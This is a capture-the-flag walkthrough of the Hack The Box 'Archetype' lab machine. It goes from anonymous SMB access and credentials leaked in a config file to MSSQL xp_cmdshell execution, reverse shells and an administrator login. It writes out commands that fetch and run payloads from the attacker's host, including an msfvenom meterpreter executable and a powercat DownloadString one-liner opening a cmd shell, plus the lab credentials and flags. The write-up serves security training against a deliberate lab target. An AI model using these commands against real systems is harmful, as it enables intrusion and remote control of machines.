---
description: Walk through of the archetype machine
---

# Archetype (HTB Starting Point 3x1)

## Target Details

IP address: 10.129.95.187

## Full Walk through

### Port scan

We use `naabu` with `nmap-cli` to speed up the usual port scan.

```bash
naabu -host 10.129.95.187 -p - -nmap-cli 'nmap -sV -sC nmap-output'
```

Port scan results:

{% code fullWidth="false" %}
```awk
[INF] Current naabu version 2.1.6 (latest)
[INF] Running CONNECT scan with non root privileges
[INF] Found 12 ports on host 10.129.95.187 (10.129.95.187)
10.129.95.187:445
10.129.95.187:49664
10.129.95.187:139
10.129.95.187:47001
10.129.95.187:49668
10.129.95.187:49665
10.129.95.187:49666
10.129.95.187:49667
10.129.95.187:1433
10.129.95.187:49669
10.129.95.187:5985
10.129.95.187:135
[INF] Running nmap command: nmap -sV -sC nmap-output -p 445,139,49665,49666,1433,49669,5985,49667,49664,47001,49668,135 10.129.95.187
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 16:24 IST
Verbosity Increased to 1.
Verbosity Increased to 2.
Service scan Timing: About 58.33% done; ETC: 16:25 (0:00:43 remaining)
Completed Service scan at 16:25, 59.63s elapsed (12 services on 1 host)
NSE: Script scanning 10.129.95.187.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 17.10s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 3.99s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.00s elapsed
Nmap scan report for 10.129.95.187
Host is up (0.37s latency).
Scanned at 2023-05-17 16:24:15 IST for 82s

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info: 
|   10.129.95.187:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2023-05-17T05:25:55+00:00; -5h29m42s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.95.187:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-17T05:18:40
| Not valid after:  2053-05-17T05:18:40
| MD5:   24ffbff89c78dbb723fe8280eb488645
| SHA-1: 946929bce2803adf2c0ba4fed1c47f546f1ca95b
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQFkVxaO4nCKFNYZUoqFp1uDANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjMwNTE3MDUxODQwWhgPMjA1MzA1MTcwNTE4NDBaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALYsm+PL
| ppJGGDP+4yVoQl4D+QmxXK9oHS+VNaSinXnxggasmA74dViF280EepEHHaRkEv3m
| DvBYLGSqILjMmgWx+XVwsYTJaCapFzxx+78UUtrCpm+x1BquGy2x0sGWB265hSl+
| 63iBevho3VjftLDqd+WgRxAMJuvVuH9J0eGBNZXBNU2prStpz+586e6l7A2J9Ku4
| FpLEaOVEWpk6/DHVLfNwsfntVThgOcKTGVvaPJxsGkVXQqMWL8L1/JMyK7luVgHe
| /e2NkAg3HlTVQ9ifSBFB4HT/QJYDhesq91GsBWtli361uHMG3LMAoGiPjNg1qZPu
| gi7wpu2fkY0X0QkCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAXLCA9eJ1o0uUcvR7
| t0Xp31KFzVitgN7QW4nHbOBYTbJIQlv9/JjplGvHYJzNWy3lLFcEEoJs0WVHwRyE
| LJoaVhPkQIPCzfhppAN8BhKjrTbzauWjV8WV6R+Nky7cEKCxI7Fa4hUxrCaBXYbW
| 1o3PrYd3OZo4bLelLMz+nWIKzSdUlwj3stw0bkvzxbZRsFy3PTzxBtqdtt6ajQIF
| 0ZdM86mMWD9CFf60FUdPsO1kCoPvTOuhOuCeh7JyXAtp20nrmpNAVIqIPid0FYDm
| jT70T3rU5aAmiubsC+y9EV3SKToB6vGdSb0kgrqrJK9V+EJW9R0mL13fXPHh20KR
| 7UUrmw==
|_-----END CERTIFICATE-----
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -4h05m41s, deviation: 3h07m52s, median: -5h29m42s
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-05-16T22:25:39-07:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56233/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 30913/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 11076/udp): CLEAN (Failed to receive data)
|   Check 4 (port 4389/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-05-17T05:25:35
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.41 seconds
```
{% endcode %}

### List available SMB shares

We have SMB running so let's try and connect with the SMB server and list available shares.

```awk
smbclient -N -L \\\\10.129.95.187\\
```

We use the `-N` flag as it supresses the default password prompt from smbclient - useful for situations where we do not need a password to access a share. We use the `-L` flag as it lists all available shares.

We get the follwing shares available:

```awk
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.95.187 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

We find that the backups share is publicly available and it's not an administrative share.&#x20;

### Enumerate and dump contents from backups share

```awk
smbclient -N  \\\\10.129.95.187\\backups
```

We find a file named `prod.dtsConfig`.&#x20;

```
smb: \> dir
  .                                   D        0  Mon Jan 20 17:50:57 2020
  ..                                  D        0  Mon Jan 20 17:50:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 17:53:02 2020

                5056511 blocks of size 4096. 2616175 blocks available
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```

A DTSCONFIG file (or a `.dtsConfig` file )is an XML configuration file used to apply property values to SQL Server Integration Services (SSIS) packages. The file contains one or more package configurations that consist of [metadata](https://techterms.com/definition/metadata) such as the server name, database names, and other connection properties to configure SSIS packages.

**DTSCONFIG files often contain sensitive information, therefore, access to the location of the files should be restricted.**

The contents of the file reveals a username and password for the MS-SQL database which we found in the port scan results.

{% code overflow="wrap" %}
```xml
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```
{% endcode %}

From this we get the USER ID as `ARCHETYPE\sql_svc` and the password as `M3g4c0rp123`.

### Gain access to MS-SQL service using the credential from production data service configuration file.

#### Using impacket-mssqlclient&#x20;

```awk
impacket-mssqlclient ARCHETYPE/sql_svc@10.129.95.187 -windows-auth
```

This helps us to connect to the database after providing the password at the password prompt.

### Command injection via xp\_cmdshell

Using the given options from mssqlclient:

```
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```

We can enable xp\_cmdshell using `enable_xp_cmdshell`, even though it is disabled by default.

After enabling it we can find the username that has access to the service:

```bash
SQL> xp_cmdshell "powershell -c whoami"
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL
```

Since we are in the `C:\Windows\system32` directory, we cannot make changes here as the Administrator can only make changes in this directory.

We can change to `C:\Users\Public` directory for downloading shells and privilege escalation executable.  Since there is no persistence we will have to use the `cd` command chained with other commands.

### Foot holding

Now that we can execute any arbitrary commands on the victim machine, we can get a firmer foothold on the victim server, aka, a reverse shell access. We can do this in two ways:

### Using metasploit and python HTTP server

Spin up an `msfvenom` payload using:

```awk
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f exe -o payload.exe
```

Start python HTTP server using:

```
python3 -m http.server 8000
```

Fetch and execute the payload using:&#x20;

```bash
xp_cmdshell "powershell -c cd C:\Users\Public; wget http://10.10.14.29:8000/payload.exe -o payload.exe; .\payload.exe"
```

This would freeze the mssqlclient, but we will get shell access on the msfconsole.

Start a new `msfconsole`:

```
msfconsole
```

We need a multi/handler exploit to catch our payload's connection request:

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.29
msf6 exploit(multi/handler) > exploit
```

Wait for sometime until the shell pops up:

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.29:4444 
[*] Sending stage (200774 bytes) to 10.129.95.187
[*] Meterpreter session 29 opened (10.10.14.29:4444 -> 10.129.95.187:49709) at 2023-05-19 22:48:36 +0530

meterpreter > ls
Listing: C:\Users\Public
========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040555/r-xr-xr-x  0     dir   2021-07-27 15:00:54 +0530  AccountPictures
040555/r-xr-xr-x  0     dir   2018-09-15 12:42:36 +0530  Desktop
040555/r-xr-xr-x  0     dir   2020-01-20 12:09:33 +0530  Documents
040555/r-xr-xr-x  0     dir   2018-09-15 12:42:36 +0530  Downloads
040555/r-xr-xr-x  0     dir   2018-09-15 12:42:36 +0530  Libraries
040555/r-xr-xr-x  0     dir   2018-09-15 12:42:36 +0530  Music
040555/r-xr-xr-x  0     dir   2018-09-15 12:42:36 +0530  Pictures
040555/r-xr-xr-x  0     dir   2018-09-15 12:42:36 +0530  Videos
100666/rw-rw-rw-  174   fil   2018-09-15 12:41:27 +0530  desktop.ini
100777/rwxrwxrwx  7168  fil   2023-05-19 17:14:51 +0530  payload.exe
```

### Using net/powercat reverse shell and python HTTP server

We can download [`powercat.ps1`](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1) file on the victim machine by hosting it in a python HTTP server.

Start python HTTP server using:

```
python3 -m http.server 8000
```

Now setup a netcat listener

```awk
nc -vnlp 4444
```

Now on our mssqlclient we use:

```sql
xp_cmdshell "powershell -c cd C:\Users\Public; IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.28:8000/powercat.ps1\"); powercat -c 10.10.14.28 -p 4444 -e cmd;"
```

The client freezes but we get a shell on our netcat listener terminal:

```
listening on [any] 4444 ...
connect to [10.10.14.28] from (UNKNOWN) [10.129.228.29] 49680
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

If we try to enter the Administrator user's directory we can't from here:

```
C:\Users>cd Administrator
cd Administrator
Access is denied.
```

So we need to perform privilege escalation.&#x20;

### Vulnerability and CVE scanning with winpeas

We can use `winpeas` to find vulnerabilities or leaked credentials that can help us in privilege escalation.&#x20;

#### Using meterpreter reverse shell

Upload the `winPEASx64.exe` using upload options in the meterpreter:

```bash
meterpreter > upload winPEASx64.exe
```

```awk
[*] Uploading  : /home/fvalkyrie/winPEASx64.exe -> winPEASx64.exe
[*] Uploaded 1.93 MiB of 1.93 MiB (100.0%): /home/fvalkyrie/winPEASx64.exe -> winPEASx64.exe
[*] Completed  : /home/fvalkyrie/winPEASx64.exe -> winPEASx64.exe
```

Execute winpeas after shell-ing into the meterpreter session:

```
meterpreter > shell
Process 604 created.
Channel 5 created.
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\sql_svc\Desktop>.\winPEASx64.exe
```

#### Using powercat reverse shell

After changing to `powershell`, we can use the following command to get `winPEASx64.exe` from the attacker machine onto the victim machine. :

```powershell
wget http://10.10.14.28:8000/winPEASx64.exe -o winPEASx64.exe; .\winPEASx64.exe
```

WinPEAS gives us some critical vulnerabilities:

```
[!] CVE-2019-0836 : VULNERABLE
  [>] https://exploit-db.com/exploits/46718
  [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/

 [!] CVE-2019-0841 : VULNERABLE
  [>] https://github.com/rogue-kdc/CVE-2019-0841
  [>] https://rastamouse.me/tags/cve-2019-0841/

 [!] CVE-2019-1064 : VULNERABLE
  [>] https://www.rythmstick.net/posts/cve-2019-1064/

 [!] CVE-2019-1130 : VULNERABLE
  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear

 [!] CVE-2019-1253 : VULNERABLE
  [>] https://github.com/padovah4ck/CVE-2019-1253
  [>] https://github.com/sgabe/CVE-2019-1253

 [!] CVE-2019-1315 : VULNERABLE
  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

 [!] CVE-2019-1385 : VULNERABLE
  [>] https://www.youtube.com/watch?v=K6gHnr-VkAg

 [!] CVE-2019-1388 : VULNERABLE
  [>] https://github.com/jas502n/CVE-2019-1388

 [!] CVE-2019-1405 : VULNERABLE
  [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/                                                                                                                                                                            
  [>] https://github.com/apt69/COMahawk

 [!] CVE-2020-0668 : VULNERABLE
  [>] https://github.com/itm4n/SysTracingPoc

 [!] CVE-2020-0683 : VULNERABLE
  [>] https://github.com/padovah4ck/CVE-2020-0683
  [>] https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/cve-2020-0683.ps1

 [!] CVE-2020-1013 : VULNERABLE
  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/

 [*] Finished. Found 12 potential vulnerabilities.
```

And the powershell console history.

```
 PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 PS history size: 79
```

Which gives us the Administrator password:

```
cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

### Gain administrator access

### Using impacket-psexec

### Using evil-winrm

```awk
evil-winrm -i 10.129.228.29 -u administrator -p 'MEGACORP_4dm1n!!'
```

```
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        7/27/2021   2:30 AM                3D Objects
d-r---        7/27/2021   2:30 AM                Contacts
d-r---        7/27/2021   2:30 AM                Desktop
d-r---        7/27/2021   2:30 AM                Documents
d-r---        7/27/2021   2:30 AM                Downloads
d-r---        7/27/2021   2:30 AM                Favorites
d-r---        7/27/2021   2:30 AM                Links
d-r---        7/27/2021   2:30 AM                Music
d-r---        7/27/2021   2:30 AM                Pictures
d-r---        7/27/2021   2:30 AM                Saved Games
d-r---        7/27/2021   2:30 AM                Searches
d-r---        7/27/2021   2:30 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator>
```

## FLAGS

### Root Flag

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
b91ccec3305e98240082d4474b848528
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

### User Flag

```
*Evil-WinRM* PS C:\Users\sql_svc\Desktop> cat user.txt
3e7b102e78218e935bf3f4951fec21a3
*Evil-WinRM* PS C:\Users\sql_svc\Desktop> 
```





